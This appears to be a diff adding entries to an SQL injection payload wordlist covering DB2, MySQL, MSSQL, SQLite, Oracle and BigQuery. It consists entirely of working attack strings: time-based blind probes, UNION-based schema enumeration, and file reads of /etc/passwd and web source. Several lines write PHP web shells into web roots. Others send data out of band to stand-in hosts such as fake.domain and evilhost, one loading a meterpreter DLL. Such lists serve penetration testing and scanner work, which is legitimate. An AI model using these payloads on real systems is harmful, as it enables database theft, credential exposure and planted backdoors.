+select * from syscat.tabauth where grantee = current user;
+select * from sysusers
+select grantee from syscat.dbauth;
+SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
+select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
+select load_file(concat('\\\\',version(),'.fake.domain\\a.txt'));
+select @@microsoftversion
+select name from sysibm.systables;
+select name, tbname, coltype from sysibm.syscolumns;
+SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
+SELECT schemaname FROM syscat.schemata;
+(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
+select @@servername
+select session_user;
+select session_user from sysibm.sysdummy1;
+select system_user from sysibm.sysdummy1;
+select user from sysibm.sysdummy1;
+select @@version
+select version();
+select versionnumber, version_timestamp from sysibm.sysversions;
+select xml2clob(xmelement(name t, table_schema)) from sysibm.tables
+select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)
+select xmlagg(xmlrow(table_schema)) from sysibm.tables
++ SLEEP(10) + '
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+&&SLEEP(5)
+&&SLEEP(5)#
+&&SLEEP(5)--
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+'&&SLEEP(5)&&'1
+true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
+true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+ UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+ UNION ALL SELECT NULL 
+ UNION ALL SELECT NULL#
+ UNION ALL SELECT NULL-- 
+UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
+ UNION ALL SELECT SLEEP(5)-- 
+UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
+ UNION ALL SELECT USER()-- 
+ UNION ALL SELECT USER(),SLEEP(5)-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- 
+UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
+UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
+UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
+UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
+UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
+UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
+UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, (select @@version)) --
+UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+' UNION SELECT sum(columnname ) from tablename --
+' union (select @@version) --
+ UNION SELECT @@VERSION,SLEEP(5),"'3
+ UNION SELECT @@VERSION,SLEEP(5),"'3'"#
+ UNION SELECT @@VERSION,SLEEP(5),3
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#
+'||utl_http.request('httP://fake.domain/')||'
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'#
+waitfor delay '00:00:05'--
+"));waitfor delay '0:0:3'--
+;waitfor delay '0:0:3'--
+';WAITFOR DELAY '0:0:30'--
+"));waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+;waitfor delay '0:0:5'--
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=1--
+' WHERE 1=1 AND 1=1#
+' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
+x' or 1=1 or 'x'='y
+x' OR full_name LIKE '%Bob%
